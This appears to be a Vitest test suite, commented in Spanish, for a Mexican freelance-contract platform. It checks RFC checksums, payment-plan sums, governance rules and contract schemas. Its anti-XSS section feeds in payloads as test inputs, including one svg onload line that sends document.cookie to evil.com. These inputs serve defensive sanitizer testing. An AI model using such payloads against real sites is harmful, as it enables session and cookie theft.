import { describe, it, expect } from 'vitest';
import {
  SAT_RFC_REGEX,
  validateSatRfcChecksum,
  PartySchema,
  StrictSatRfcSchema,
  StrictPartySchema,
  AddressSchema,
  BankAccountSchema,
  LegalRepresentativeSchema
} from '../src/core/schemas/party.js';
import {
  MilestoneSchema,
  PaymentPlanSchema,
  type PaymentPlan
} from '../src/core/schemas/milestone.js';
import {
  sanitizeAntiXSS,
  containsXSSPayload,
  sanitizedStringSchema
} from '../src/core/schemas/sanitize.js';
import {
  ContractSchema,
  CreateContractInputSchema,
  type ContractData
} from '../src/core/schemas/contract.js';
import { ScopeSchema } from '../src/core/schemas/scope.js';
import { IntellectualPropertySchema } from '../src/core/schemas/intellectual-property.js';
import { GovernanceSchema } from '../src/core/schemas/governance.js';
import { isFieldAdjustmentAllowed, AdjustmentSuggestionSchema } from '../src/core/schemas/adjustment.js';

describe('Suite de Pruebas: Schemas Contractuales y Reglas de Negocio', () => {

  describe('1. Validación de RFC Oficial del SAT y Dígito Verificador Módulo 11', () => {
    it('valida RFCs de Personas Físicas (13 caracteres) con estructura correcta', () => {
      // 4 letras + 6 dígitos de fecha + 3 de homoclave
      expect(SAT_RFC_REGEX.test('VAMS9005128D1')).toBe(true);
      expect(SAT_RFC_REGEX.test('GARM920315HA0')).toBe(true);
      expect(SAT_RFC_REGEX.test('MECJ8801018D3')).toBe(true);
      expect(SAT_RFC_REGEX.test('ROAE750228HN2')).toBe(true);
    });

    it('valida RFCs de Personas Morales (12 caracteres) con estructura correcta', () => {
      // 3 letras + 6 dígitos de fecha + 3 de homoclave
      expect(SAT_RFC_REGEX.test('IDN180620TX6')).toBe(true);
      expect(SAT_RFC_REGEX.test('PME0101011A8')).toBe(true);
      expect(SAT_RFC_REGEX.test('ABC680524P76')).toBe(true);
    });

    it('rechaza RFCs con estructura inválida o caracteres fuera de catálogo', () => {
      expect(SAT_RFC_REGEX.test('INVALID_RFC')).toBe(false);
      expect(SAT_RFC_REGEX.test('GARM920315-HA4')).toBe(false); // No admite guiones
      expect(SAT_RFC_REGEX.test('GARM920315')).toBe(false);     // Incompleto (sin homoclave)
      expect(SAT_RFC_REGEX.test('GARM920315HA012')).toBe(false);// Exceso de longitud
      expect(SAT_RFC_REGEX.test('GARM921315HA0')).toBe(false);  // Mes 13 inválido
      expect(SAT_RFC_REGEX.test('GARM920332HA0')).toBe(false);  // Día 32 inválido
    });

    it('valida el algoritmo Módulo 11 del SAT en RFCs con homoclave auténtica', () => {
      // Casos válidos matemáticos reales
      expect(validateSatRfcChecksum('VAMS9005128D1')).toBe(true);
      expect(validateSatRfcChecksum('IDN180620TX6')).toBe(true);
      expect(validateSatRfcChecksum('GARM920315HA0')).toBe(true);
      expect(validateSatRfcChecksum('MECJ8801018D7')).toBe(true);

      // Normalización insensible a mayúsculas y espacios
      expect(validateSatRfcChecksum('  vams9005128d1  ')).toBe(true);
      expect(validateSatRfcChecksum('idn180620tx6')).toBe(true);
    });

    it('detecta y rechaza homoclaves falsas o alteradas (QA-DAT-02)', () => {
      // Mismo RFC pero con dígito verificador adulterado
      expect(validateSatRfcChecksum('VAMS9005128D9')).toBe(false);
      expect(validateSatRfcChecksum('VAMS9005128D3')).toBe(false);
      expect(validateSatRfcChecksum('IDN180620TX0')).toBe(false);
      expect(validateSatRfcChecksum('IDN180620TX9')).toBe(false);
      expect(validateSatRfcChecksum('GARM920315000')).toBe(false);
    });

    it('valida dígito verificador calculado cuando residuo genera "A" o "0"', () => {
      // RFC persona moral que produce 'A' (diferencia 10)
      expect(validateSatRfcChecksum('ABC01010119A')).toBe(true);
      // RFC persona moral que produce '0' (residuo 0)
      expect(validateSatRfcChecksum('ABC010101130')).toBe(true);
      // Checksum retorna false ante entrada vacía o nula
      expect(validateSatRfcChecksum('')).toBe(false);
    });

    it('StrictSatRfcSchema valida formato y algoritmo Módulo 11 en pipeline Zod', () => {
      expect(StrictSatRfcSchema.safeParse('VAMS9005128D1').success).toBe(true);
      expect(StrictSatRfcSchema.safeParse('IDN180620TX6').success).toBe(true);

      // Falla si el formato es inválido
      const invalidFormat = StrictSatRfcSchema.safeParse('XYZ-INVALID');
      expect(invalidFormat.success).toBe(false);

      // Falla si el formato pasa pero el dígito verificador es falso
      const invalidCheckDigit = StrictSatRfcSchema.safeParse('VAMS9005128D9');
      expect(invalidCheckDigit.success).toBe(false);
      if (!invalidCheckDigit.success) {
        expect(invalidCheckDigit.error.issues[0].message).toContain('Módulo 11');
      }
    });
  });

  describe('2. Validación de Partes Contractuales y Dirección Fiscal', () => {
    it('valida una Parte Creadora física completa con datos fiscales y bancarios', () => {
      const validCreator = {
        role: 'creator' as const,
        personType: 'physical' as const,
        legalName: 'Sofía Valenzuela Mendoza',
        commercialName: 'Estudio UX Creativo',
        rfc: 'VAMS9005128D1',
        taxRegime: '626 - RESICO',
        email: 'sofia@uxstudio.mx',
        phone: '+525512345678',
        address: {
          street: 'Av. Álvaro Obregón',
          exteriorNumber: '151',
          interiorNumber: '4B',
          neighborhood: 'Roma Norte',
          municipality: 'Cuauhtémoc',
          state: 'Ciudad de México',
          postalCode: '06700',
          country: 'México'
        },
        bankAccount: {
          bankName: 'BBVA México',
          clabe: '012180015678901234',
          accountHolder: 'Sofía Valenzuela Mendoza'
        }
      };

      const parseResult = PartySchema.safeParse(validCreator);
      expect(parseResult.success).toBe(true);
    });

    it('valida una Parte Cliente moral con representante legal acreditado', () => {
      const validClient = {
        role: 'client' as const,
        personType: 'moral' as const,
        legalName: 'Innovaciones Digitales del Norte S.A. de C.V.',
        commercialName: 'NovaTech',
        rfc: 'IDN180620TX6',
        email: 'contacto@novatech.mx',
        address: {
          street: 'Av. Constitución',
          exteriorNumber: '2000',
          neighborhood: 'Obispado',
          municipality: 'Monterrey',
          state: 'Nuevo León',
          postalCode: '64060',
          country: 'México'
        },
        legalRepresentative: {
          fullName: 'Lic. Roberto Garza Sada',
          rfc: 'GASR701115AB1',
          notarialDeedNumber: 'Escritura Pública No. 45,210'
        }
      };

      const parseResult = PartySchema.safeParse(validClient);
      expect(parseResult.success).toBe(true);
    });

    it('rechaza direcciones con código postal no mexicano de 5 dígitos', () => {
      const invalidAddress = {
        street: 'Main St',
        exteriorNumber: '100',
        neighborhood: 'Downtown',
        municipality: 'Austin',
        state: 'Texas',
        postalCode: '787012', // 6 dígitos (inválido en México)
        country: 'México'
      };

      expect(AddressSchema.safeParse(invalidAddress).success).toBe(false);
    });

    it('rechaza cuentas bancarias cuya CLABE no tenga exactamente 18 dígitos numéricos', () => {
      const invalidClabe = {
        bankName: 'Banorte',
        clabe: '01218001567890', // Solo 14 dígitos
        accountHolder: 'Sofía Valenzuela'
      };

      expect(BankAccountSchema.safeParse(invalidClabe).success).toBe(false);
    });
  });

  describe('3. Invariantes Matemáticas de Hitos y Plan de Pagos al 100%', () => {
    it('acepta esquemas 50/50 consistentes al 100% en porcentajes y centavos', () => {
      const plan5050: PaymentPlan = {
        currency: 'MXN',
        totalAmountCents: 4000000, // $40,000.00 MXN
        model: 'fixed_50_50',
        milestones: [
          {
            id: 'm1',
            order: 1,
            title: 'Anticipo 50%',
            deliverables: ['Kick-off y Wireframes'],
            percentage: 50,
            amountCents: 2000000,
            status: 'pending'
          },
          {
            id: 'm2',
            order: 2,
            title: 'Finiquito 50%',
            deliverables: ['Diseño Final Handoff'],
            percentage: 50,
            amountCents: 2000000,
            status: 'pending'
          }
        ],
        latePaymentInterestRateMonthly: 3.0,
        gracePeriodDays: 5,
        suspensionThresholdDays: 5
      };

      const parsed = PaymentPlanSchema.safeParse(plan5050);
      expect(parsed.success).toBe(true);
    });

    it('acepta esquemas en tres partes (33.33% + 33.33% + 33.34%) con tolerancia decimal', () => {
      const planThreeParts: PaymentPlan = {
        currency: 'MXN',
        totalAmountCents: 3000000,
        model: 'milestones',
        milestones: [
          {
            id: 'm1',
            order: 1,
            title: 'Hito 1 - Discovery',
            deliverables: ['Investigación'],
            percentage: 33.33,
            amountCents: 1000000,
            status: 'pending'
          },
          {
            id: 'm2',
            order: 2,
            title: 'Hito 2 - Diseño UI',
            deliverables: ['Figma System'],
            percentage: 33.33,
            amountCents: 1000000,
            status: 'pending'
          },
          {
            id: 'm3',
            order: 3,
            title: 'Hito 3 - Entrega y Aprobación',
            deliverables: ['Assets vectoriales'],
            percentage: 33.34,
            amountCents: 1000000,
            status: 'pending'
          }
        ],
        latePaymentInterestRateMonthly: 3.0,
        gracePeriodDays: 5,
        suspensionThresholdDays: 5
      };

      const parsed = PaymentPlanSchema.safeParse(planThreeParts);
      expect(parsed.success).toBe(true);
    });

    it('rechaza de forma estricta planes cuya suma de porcentajes exceda el 100% (QA-DAT-05)', () => {
      const planExcess = {
        currency: 'MXN',
        totalAmountCents: 3000000,
        model: 'milestones',
        milestones: [
          {
            id: 'm1',
            order: 1,
            title: 'Anticipo',
            deliverables: ['Wireframes'],
            percentage: 60, // 60 + 50 = 110%
            amountCents: 1800000,
            status: 'pending'
          },
          {
            id: 'm2',
            order: 2,
            title: 'Finiquito',
            deliverables: ['Entrega'],
            percentage: 50,
            amountCents: 1500000,
            status: 'pending'
          }
        ]
      };

      const parsed = PaymentPlanSchema.safeParse(planExcess);
      expect(parsed.success).toBe(false);
      if (!parsed.success) {
        expect(parsed.error.issues.some(i => i.message.includes('100%'))).toBe(true);
      }
    });

    it('rechaza planes cuya suma de porcentajes sea inferior al 100%', () => {
      const planDeficit = {
        currency: 'MXN',
        totalAmountCents: 3000000,
        model: 'milestones',
        milestones: [
          {
            id: 'm1',
            order: 1,
            title: 'Anticipo',
            deliverables: ['Entrega 1'],
            percentage: 40,
            amountCents: 1200000,
            status: 'pending'
          },
          {
            id: 'm2',
            order: 2,
            title: 'Finiquito',
            deliverables: ['Entrega 2'],
            percentage: 40, // 40 + 40 = 80% (Faltan 20%)
            amountCents: 1200000,
            status: 'pending'
          }
        ]
      };

      const parsed = PaymentPlanSchema.safeParse(planDeficit);
      expect(parsed.success).toBe(false);
    });

    it('rechaza planes donde la suma aritmética de centavos no coincide con totalAmountCents', () => {
      const planMismatchAmount = {
        currency: 'MXN',
        totalAmountCents: 3000000, // $30,000.00
        model: 'milestones',
        milestones: [
          {
            id: 'm1',
            order: 1,
            title: 'Paso 1',
            deliverables: ['D1'],
            percentage: 50,
            amountCents: 1000000, // $10,000 (discrepancia)
            status: 'pending'
          },
          {
            id: 'm2',
            order: 2,
            title: 'Paso 2',
            deliverables: ['D2'],
            percentage: 50,
            amountCents: 1000000, // $10,000 (suma = $20,000, esperado $30,000)
            status: 'pending'
          }
        ]
      };

      const parsed = PaymentPlanSchema.safeParse(planMismatchAmount);
      expect(parsed.success).toBe(false);
    });

    it('obliga a que los importes se representen en números enteros de centavos', () => {
      const invalidMilestoneFloat = {
        id: 'm1',
        order: 1,
        title: 'Anticipo',
        deliverables: ['D1'],
        percentage: 50,
        amountCents: 150000.75, // Decimal no permitido en centavos enteros
        status: 'pending'
      };

      const parsed = MilestoneSchema.safeParse(invalidMilestoneFloat);
      expect(parsed.success).toBe(false);
    });
  });

  describe('4. Sanitización Anti-XSS y Resistencia ante Inyecciones Maliciosas (STRIDE)', () => {
    it('detecta vectores de inyección XSS conocidos', () => {
      expect(containsXSSPayload('<script>alert("XSS")</script>')).toBe(true);
      expect(containsXSSPayload('"><img src=x onerror=alert("Pactio_XSS")>')).toBe(true);
      expect(containsXSSPayload('<svg/onload=fetch("https://evil.com")>')).toBe(true);
      expect(containsXSSPayload('javascript:alert(1)')).toBe(true);
      expect(containsXSSPayload('Texto limpio sin código malicioso')).toBe(false);
    });

    it('neutraliza payloads de Pentest automatizados sin afectar la integridad de los datos', () => {
      // Vector 1: img onerror
      const rawPayload1 = 'Proyecto UX "><img src=x onerror=alert("Pactio_XSS_Exploit")>';
      const sanitized1 = sanitizeAntiXSS(rawPayload1);
      expect(sanitized1).not.toContain('<img');
      expect(sanitized1).not.toContain('onerror');
      expect(sanitized1).toContain('Proyecto UX');

      // Vector 2: svg onload con exfiltración
      const rawPayload2 = '<svg/onload=fetch(\'https://evil.com/steal?c=\'+document.cookie)>Logo Final';
      const sanitized2 = sanitizeAntiXSS(rawPayload2);
      expect(sanitized2).not.toContain('<svg');
      expect(sanitized2).not.toContain('onload');
      expect(sanitized2).toContain('Logo Final');

      // Vector 3: javascript pseudo-protocol
      const rawPayload3 = 'javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>';
      const sanitized3 = sanitizeAntiXSS(rawPayload3);
      expect(sanitized3).not.toContain('javascript:');
      expect(sanitized3).not.toContain('<svg');
    });

    it('preserva de forma fidedigna caracteres especiales legítimos en español y razones sociales (QA-DAT-03)', () => {
      const legitimateBusinessName = 'Soluciones de Software & Cía., S.A. de C.V.';
      const sanitized = sanitizeAntiXSS(legitimateBusinessName);
      expect(sanitized).toBe('Soluciones de Software & Cía., S.A. de C.V.');

      const spanishAccents = 'Diseño Ágil de Interfaces & UI/UX para Aplicación Móvil en México — Creador & Cliente.';
      expect(sanitizeAntiXSS(spanishAccents)).toBe(spanishAccents);
    });

    it('sanitizedStringSchema integra la neutralización XSS en la tubería de Zod', () => {
      const schema = sanitizedStringSchema(3, 100);
      const attackInput = '<script>alert("pactio")</script>Diseño de Marca';
      const result = schema.safeParse(attackInput);

      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data).toBe('Diseño de Marca');
        expect(result.data).not.toContain('<script>');
      }
    });
  });

  describe('5. Esquemas de Gobernanza, Propiedad Intelectual y Redlining', () => {
    it('valida la regla de oro de Propiedad Intelectual (LFDA Art. 83) condicionada a liquidación', () => {
      const ip = IntellectualPropertySchema.parse({});
      expect(ip.transferTiming).toBe('upon_final_payment');
      expect(ip.moralRightsRetention).toBe(true);
      expect(ip.creatorPortfolioRights).toBe(true);
    });

    it('valida los parámetros de Gobernanza y Silencio Tácito', () => {
      const gov = GovernanceSchema.parse({});
      expect(gov.includedRevisionRounds).toBe(2);
      expect(gov.tacitApprovalWindowDays).toBe(5);
      expect(gov.killFeePercentage).toBe(50);
      expect(gov.liabilityCap).toBe('fees_paid_to_date');
    });

    it('restringe la modificación de campos inmutables por política de gobernanza', () => {
      // Campos permitidos para ajuste
      expect(isFieldAdjustmentAllowed('milestones.dueDate').allowed).toBe(true);
      expect(isFieldAdjustmentAllowed('governance.tacitApprovalWindowDays').allowed).toBe(true);

      // Campos estrictamente protegidos e inmutables
      expect(isFieldAdjustmentAllowed('parties.creator.rfc').allowed).toBe(false);
      expect(isFieldAdjustmentAllowed('intellectualProperty.transferTiming').allowed).toBe(false);
      expect(isFieldAdjustmentAllowed('governance.liabilityCap').allowed).toBe(false);
    });

    it('valida el esquema de sugerencias de ajuste (AdjustmentSuggestionSchema)', () => {
      const validAdjustment = {
        id: 'adj-101',
        clauseId: 'SEGUNDA',
        field: 'milestones.dueDate',
        originalValue: '2026-11-15',
        suggestedValue: '2026-11-20',
        reason: 'El cliente requiere 5 días hábiles adicionales para recopilar credenciales.',
        status: 'pending' as const,
        suggestedBy: 'client' as const,
        createdAt: new Date().toISOString()
      };

      const parsed = AdjustmentSuggestionSchema.safeParse(validAdjustment);
      expect(parsed.success).toBe(true);
    });
  });

  describe('6. Validación del Esquema Maestro ContractSchema', () => {
    it('valida un contrato maestro completo y consistente en todos sus campos', () => {
      const now = new Date().toISOString();
      const mockContract: ContractData = {
        id: 'f47ac10b-58cc-4372-a567-0e02b2c3d479',
        contractCode: 'PACT-8X9K2',
        status: 'DRAFT',
        versionMajor: 1,
        versionMinor: 0,
        parties: {
          creator: {
            role: 'creator',
            personType: 'physical',
            legalName: 'Sofía Valenzuela Mendoza',
            rfc: 'VAMS9005128D1',
            email: 'sofia@uxstudio.mx',
            address: {
              street: 'Av. Álvaro Obregón',
              exteriorNumber: '151',
              neighborhood: 'Roma Norte',
              municipality: 'Cuauhtémoc',
              state: 'CDMX',
              postalCode: '06700',
              country: 'México'
            }
          },
          client: {
            role: 'client',
            personType: 'moral',
            legalName: 'Innovaciones Digitales del Norte S.A. de C.V.',
            rfc: 'IDN180620TX6',
            email: 'contacto@novatech.mx',
            address: {
              street: 'Av. Constitución',
              exteriorNumber: '2000',
              neighborhood: 'Obispado',
              municipality: 'Monterrey',
              state: 'Nuevo León',
              postalCode: '64060',
              country: 'México'
            }
          }
        },
        scope: {
          projectTitle: 'Diseño UX/UI de App Móvil',
          serviceCategory: 'ux_ui_design',
          description: 'Flujos completos y Design System en Figma.',
          deliverablesSummary: ['Figma System', 'Prototipo'],
          requiredClientInputs: ['Brand Assets'],
          outOfScope: ['Desarrollo backend'],
          startDateTrigger: 'upon_inputs_received'
        },
        payments: {
          currency: 'MXN',
          totalAmountCents: 3000000,
          model: 'fixed_50_50',
          milestones: [
            {
              id: 'm1',
              order: 1,
              title: 'Anticipo',
              percentage: 50,
              amountCents: 1500000,
              deliverables: ['Wireframes'],
              status: 'pending'
            },
            {
              id: 'm2',
              order: 2,
              title: 'Finiquito',
              percentage: 50,
              amountCents: 1500000,
              deliverables: ['UI Kit'],
              status: 'pending'
            }
          ],
          latePaymentInterestRateMonthly: 3,
          gracePeriodDays: 5,
          suspensionThresholdDays: 5
        },
        intellectualProperty: {
          transferTiming: 'upon_final_payment',
          moralRightsRetention: true,
          creatorPortfolioRights: true,
          confidentialityDurationYears: 3,
          retainCreatorBackgroundIP: true,
          nonExclusiveServices: true
        },
        governance: {
          includedRevisionRounds: 2,
          additionalRevisionFeeCents: 150000,
          tacitApprovalWindowDays: 5,
          killFeePercentage: 50,
          liabilityCap: 'fees_paid_to_date',
          jurisdiction: {
            city: 'Ciudad de México',
            state: 'CDMX',
            country: 'México'
          },
          disputeResolutionMethod: 'amicable_negotiation'
        },
        adjustments: [],
        signatures: {},
        canonicalMarkdown: '# CONTRATO TEST',
        canonicalPlainText: 'CONTRATO TEST',
        documentHash: 'a'.repeat(64),
        auditTrail: [],
        createdAt: now,
        updatedAt: now,
        deletedAt: null
      };

      const parsed = ContractSchema.safeParse(mockContract);
      expect(parsed.success).toBe(true);
    });

    it('rechaza contratos donde los roles de las partes están invertidos', () => {
      const now = new Date().toISOString();
      const invertedParties = {
        creator: {
          role: 'client' as const, // Invertido: debe ser creator
          personType: 'physical' as const,
          legalName: 'Sofía Valenzuela Mendoza',
          rfc: 'VAMS9005128D1',
          email: 'sofia@uxstudio.mx',
          address: {
            street: 'Av. Álvaro Obregón',
            exteriorNumber: '151',
            neighborhood: 'Roma Norte',
            municipality: 'Cuauhtémoc',
            state: 'CDMX',
            postalCode: '06700',
            country: 'México'
          }
        },
        client: {
          role: 'creator' as const, // Invertido: debe ser client
          personType: 'moral' as const,
          legalName: 'Innovaciones Digitales del Norte S.A. de C.V.',
          rfc: 'IDN180620TX6',
          email: 'contacto@novatech.mx',
          address: {
            street: 'Av. Constitución',
            exteriorNumber: '2000',
            neighborhood: 'Obispado',
            municipality: 'Monterrey',
            state: 'Nuevo León',
            postalCode: '64060',
            country: 'México'
          }
        }
      };

      const input = {
        parties: invertedParties,
        scope: {
          projectTitle: 'Proyecto Test',
          description: 'Descripción detallada de más de diez caracteres.',
          deliverablesSummary: ['Entregable 1']
        },
        payments: {
          totalAmountCents: 1000000,
          milestones: [
            {
              id: 'm1',
              order: 1,
              title: 'Pago único',
              percentage: 100,
              amountCents: 1000000,
              deliverables: ['Todo'],
              status: 'pending'
            }
          ]
        }
      };

      const parsed = CreateContractInputSchema.safeParse(input);
      expect(parsed.success).toBe(false);
    });
  });

});
